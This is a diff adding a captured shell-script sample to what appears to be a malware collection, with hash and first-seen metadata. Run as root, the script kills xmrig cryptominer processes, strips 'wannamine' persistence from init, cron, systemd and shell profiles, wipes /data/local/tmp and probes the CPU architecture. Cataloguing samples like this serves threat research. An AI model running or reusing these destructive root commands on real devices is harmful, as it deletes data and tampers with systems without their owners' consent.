@@ -1,0 +1,66 @@
+# sha256: a9fe1e0750deb881bed24544f5e015b145ed8a8bae6f8cd5f55fa3220ea8ea89
+# family: script_generic
+# kind: script
+# size_bytes: 3635
+# first_seen: 2026-07-25 13:34:24.088196 UTC
+# times_seen: 1
+# yara_matches: none
+# ------------------------------------------------------------
+
+echo 'test'
+su -c '[ -f /data/local/tmp/.wannamine_processed ]'
+su -c 'killall -TERM xmrig-aarch64 xmrig-armv7 xmrig-x86_64 run_miner_full.sh run_watchdog.sh 2>/dev/null || true'
+su -c 'pkill -f -TERM xmrig 2>/dev/null || true'
+su -c 'pkill -f -TERM run_miner 2>/dev/null || true'
+su -c 'pkill -f -TERM run_watchdog 2>/dev/null || true'
+su -c 'killall -KILL xmrig-aarch64 xmrig-armv7 xmrig-x86_64 run_miner_full.sh run_watchdog.sh 2>/dev/null || true'
+su -c 'pkill -f -KILL xmrig 2>/dev/null || true'
+su -c 'pkill -f -KILL run_miner 2>/dev/null || true'
+su -c 'pkill -f -KILL run_watchdog 2>/dev/null || true'
+su -c 'if [ -f /sys/fs/cgroup/memory/wannamine/cgroup.procs ]; then for pid in $(cat /sys/fs/cgroup/memory/wannamine/cgroup.procs); do kill -9 $pid 2>/dev/null; done; fi'
+su -c 'rmdir /sys/fs/cgroup/memory/wannamine 2>/dev/null || true'
+su -c 'sed -i '/vm.overcommit_memory=1/d' /etc/sysctl.conf 2>/dev/null || true'
+su -c 'sed -i '/vm.overcommit_ratio=80/d' /etc/sysctl.conf 2>/dev/null || true'
+su -c 'sed -i '/vm.oom_kill_allocating_task=0/d' /etc/sysctl.conf 2>/dev/null || true'
+su -c 'sysctl -p 2>/dev/null || true'
+su -c 'rm -f /data/adb/service.d/watchdog 2>/dev/null || true'
+su -c 'rm -f /system/etc/init.d/99watchdog 2>/dev/null || true'
+su -c 'rm -rf /data/local/tmp/.paranoia 2>/dev/null || true'
+su -c 'rm -f /data/adb/post-fs-data.d/99watchdog 2>/dev/null || true'
+su -c 'rm -rf /data/adb/apex/persist 2>/dev/null || true'
+su -c 'rm -f /data/.qemu/start.sh 2>/dev/null || true'
+su -c 'rm -f /vendor/bin/watchdog 2>/dev/null || true'
+su -c 'sed -i '/service watchdog/d' /vendor/etc/init.rc 2>/dev/null || true'
+su -c 'sed -i '/watchdog/d' /vendor/etc/init.rc 2>/dev/null || true'
+su -c 'rm -f /etc/cron.d/watchdog 2>/dev/null || true'
+su -c 'crontab -l | grep -v 'run_watchdog.sh' | crontab - 2>/dev/null || true'
+su -c 'sed -i '/run_watchdog.sh/d' /etc/rc.local 2>/dev/null || true'
+su -c 'rm -f /etc/systemd/system/watchdog.service 2>/dev/null || true'
+su -c 'rm -f /etc/systemd/system/wannamine.service 2>/dev/null || true'
+su -c 'systemctl disable watchdog.service 2>/dev/null || true'
+su -c 'systemctl disable wannamine.service 2>/dev/null || true'
+su -c 'systemctl stop watchdog.service 2>/dev/null || true'
+su -c 'systemctl stop wannamine.service 2>/dev/null || true'
+su -c 'rm -f /etc/init.d/watchdog 2>/dev/null || true'
+su -c 'rm -f /etc/init/watchdog.conf 2>/dev/null || true'
+su -c 'rm -f /etc/supervisor/conf.d/watchdog.conf 2>/dev/null || true'
+su -c 'rm -f /etc/udev/rules.d/99-watchdog.rules 2>/dev/null || true'
+su -c 'sed -i '/watchdog/d' /etc/anacrontab 2>/dev/null || true'
+su -c 'sed -i '/run_watchdog.sh/d' ~/.bashrc 2>/dev/null || true'
+su -c 'sed -i '/run_watchdog.sh/d' ~/.profile 2>/dev/null || true'
+su -c 'sed -i '/run_watchdog.sh/d' ~/.bash_profile 2>/dev/null || true'
+su -c 'rm -f /etc/profile.d/watchdog.sh 2>/dev/null || true'
+su -c 'rm -f /tmp/watchdog 2>/dev/null || true'
+su -c 'rm -rf /data/local/tmp/.backup 2>/dev/null || true'
+su -c 'rm -rf /data/.wannamine_backup 2>/dev/null || true'
+su -c 'rm -rf /sdcard/.android_secure/.wannamine 2>/dev/null || true'
+su -c 'rm -rf /system/xbin/.wannamine 2>/dev/null || true'
+su -c 'rm -rf /vendor/bin/.wannamine 2>/dev/null || true'
+su -c 'rm -rf /data/adb/.wannamine_backup 2>/dev/null || true'
+su -c 'rm -rf /data/misc/.wannamine 2>/dev/null || true'
+su -c 'rm -rf /sdcard/Download/.hidden_wannamine 2>/dev/null || true'
+su -c 'rm -rf /data/local/tmp/* /data/local/tmp/.[!.]* /data/local/tmp/..?* 2>/dev/null || true'
+su -c 'rm -f /data/local/tmp/.wannamine_processed 2>/dev/null || true'
+getprop ro.product.cpu.abi
+uname -m
+arch
